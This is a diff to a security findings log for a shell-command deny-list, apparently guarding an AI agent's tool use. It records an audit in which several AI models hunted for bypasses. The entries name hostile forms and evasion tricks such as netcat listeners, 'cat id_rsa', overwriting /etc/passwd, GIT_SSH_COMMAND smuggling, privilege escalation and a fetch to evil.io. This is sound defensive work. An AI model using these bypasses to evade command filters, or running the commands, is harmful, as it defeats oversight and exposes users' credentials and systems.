@@ -595,3 +595,64 @@ During implementation, the Cowork mount's `Edit` tool was confirmed to silently 
 ---
 
 *End of S65 twelfth-pass findings.*
+
+---
+
+## 2026-05-04 Bypass-Discovery Round — External-AI Audit Closure
+
+**Round naming:** P0.1–P0.6, P1.1–P1.20 (mirrors `forgerift-license-api/docs/legal/external-ai-bypass-triage_2026-05.md`).
+**Source:** Round-2 multi-model bypass-discovery audit (DeepSeek + Grok + Gemini, 67 raw findings → 22 deduplicated unique).
+**Method:** Each finding verified against the live `src/tools.ts` via direct `checkBlocked()` invocation before any code change. Stale findings (already incidentally closed by prior work) were pinned with regression tests under the 2026-05 round naming so future regressions surface with the right finding ID.
+**Status at submission:** All in-scope LT findings closed in v1.13.x patch series. 593/593 tests pass. No changes to auth, audit-log writer, or `legal/` directory (out of scope per triage instructions).
+
+### Disposition
+
+| Finding | Disposition | Closure | Test count | Note |
+|---|---|---|---|---|
+| **P0.1** | New explicit rule | `52f6245` | 10 | Call operator `& {…}` / `& '…'` / `& "…"`. Was caught incidentally by single-`&` chaining; explicit rule surfaces the right `code-exec` category. `& $var` legit form left to its own pre-existing rule. |
+| **P0.2** | Already closed (F-LT-42) | `4d3696c` (test pin) | 5 | `cmd.exe /c` already covered by `\bcmd(?:\.exe)?\b…`. |
+| **P0.3** | Already closed (F-LT-36/78) + closed-as-class via A1 | `4d3696c` (test pin) + `d5986dd` (A1) | 6 + 10 | `pwsh` covered by parallel hand-written rules at every site; A1 alias map closes the class architecturally. |
+| **P0.4** | New explicit rules | `b078f67` | 9 | `\bsudo\b` → `\bsudo(?:edit)?\b`; added `doas`, `pkexec`, `runuser`, `gsudo`. `sudoedit foo` was previously only blocked when paired with a sensitive-path token. |
+| **P0.5** | Already closed (F-LT-36 alternation) | `4d3696c` (test pin) | 6 | `-enc`/`-en`/`-e` short forms covered by `-[cfe][a-zA-Z]*\b`. |
+| **P0.6** | Incidentally closed via `\b` | `480e61d` (test pin) | 9 | Path-qualified `/usr/bin/<verb>` matches `\b<verb>\b` because `\b` matches at the path-separator-to-name boundary. Pin under round naming. |
+| **A1** | New architectural | `d5986dd` | 10 | `BINARY_ALIASES` map + `aliasNormalize()` — strips path qualification, `.exe` suffix, version suffixes (`python3.11`); rewrites argv[0] to canonical form before pattern matching. Closes the class behind P0.3 / P1.16 / P1.17 / P1.2. |
+| **A2** | Documented, no code change | (this entry) | n/a | Word-boundary tightening was the architectural intent behind P0.4 and a few P1 rules; the actual code change for the only exploitable case (`sudoedit`) shipped in P0.4. |
+| **P1.1** | New rule | `3a395ef` | 6 | `base64 -D` / `--decode` / `--decode-line` — prior rule only caught `-d`. |
+| **P1.6** | New rule | `d443d9d` | 8 | `GIT_DIR` / `GIT_INDEX_FILE` / `GIT_WORK_TREE` / `GIT_SSH_COMMAND` / `GIT_EDITOR` / `GIT_EXEC_PATH` / `GIT_TEMPLATE_DIR` / `GIT_CEILING_DIRECTORIES` / `GIT_CONFIG*` / `GIT_PAGER` / `GIT_ASKPASS` / `GIT_OBJECT_DIRECTORY` / `GIT_NAMESPACE` / `GIT_SSH` env-var smuggling. |
+| **P1.7** | New rule | `2393e2f` | 7 | `fetch` / `axel` / `aria2c` / `httpie` / `http <METHOD>` / `https <METHOD>`. Prior incidental block depended on URL ending in `.com` (executable extension); `.io`/`.org` URLs slipped. |
+| **P1.12** | New rule | `c09aaa7` | 4 | `chattr` (immutable bit / append-only — denial-of-administration). |
+
+### Findings already covered by prior work — verified, not re-fixed
+
+These were re-discovered by the round-2 audit but already closed in earlier passes. Pinned via P0.2/P0.3/P0.5/P0.6 regression-test commits above so a future regression surfaces with the round-2 finding ID:
+
+| Finding | Pre-existing closure |
+|---|---|
+| P1.2 ncat/socat/telnet | Already in BLOCKED_PATTERNS; A1 alias map adds canonical-form normalization for `ncat`/`netcat`/`nc.openbsd`. |
+| P1.8 `[Reflection.Assembly]::LoadFrom` etc. | F-LT-44 covers `[Reflection.Assembly]::Load*`. |
+| P1.9 `erase` | Already at L29 (`\berase\b`). |
+| P1.10 `cmd /a /c` | F-LT-42 covers via `(?:\s+\/[a-zA-Z:][^\s]*)*\s+\/[cCkK]`. |
+| P1.11 `nc-l` | `\bnc\b` matches `nc-l` because `\b` matches between `c` and `-`. |
+| P1.13 `head -c 0 > /etc/passwd` etc. | M7-extended redirect normalization + Cat 7 (cred-key destruction) catches sensitive-path redirect targets. |
+| P1.15 `%COMSPEC%` etc. | Generic `%[A-Za-z_][A-Za-z0-9_]*%` rule (L478) blocks ALL `%FOO%` env-var references. |
+| P1.16 `pip3` | A1 alias map. |
+| P1.17 `nodejs` | A1 alias map. |
+| P1.18 `cipher /w:C:\` | `\bcipher\s+\/w/i` (L35) matches via `\b`. |
+| P1.19 `Remove-ItemProperty` | Already at L37. |
+| P1.20 `ssh-keygen create` | Caught incidentally by data-exfil category for now; AMBER-tier promotion deferred. |
+
+### Findings deferred / out of scope
+
+- **P1.14 `cd .ssh && cat id_rsa`** — Architectural A3 (path normalization in sensitive-file matcher). The `&&` chaining is hard-blocked, so the literal example is closed at the chaining layer. The deeper bypass (`cd .ssh; cat id_rsa` via separate calls under a relative-path matcher) is a separate workstream not in this round's scope.
+
+### Test outcome
+
+- **513/513 → 593/593 pass.** 80 new tests added across this round (P0.1: 10, P0.2: 5, P0.3: 6, P0.4: 9, P0.5: 6, P0.6: 9, A1: 10, P1.1: 6, P1.6: 8, P1.7: 7, P1.12: 4). Zero regressions on the prior 513.
+
+### Method note
+
+The triage doc's claim that "5 of 6 P0-candidate bypasses verified real" was correct against the *literal regex pattern named in the triage*, but the layered deny-list (BLOCKED + HARD_BLOCKED + chaining + obfuscation tiers) caught most of them via different rules. Each finding was re-verified against the live code; explicit rules were added even where an incidental match already existed, on the principle that the audit-claimed coverage should match the actually-firing rule (defense in depth + clearer error categories).
+
+For the P0.4 (`sudoedit foo`), P1.1 (`base64 --decode`), P1.6 (GIT_DIR), P1.7 (`fetch http://evil.io`), and P1.12 (`chattr`) cases, the bypass was genuinely uncovered and the new rules are the first time those forms are blocked.
+
+*End of 2026-05-04 bypass-review round (LT).*
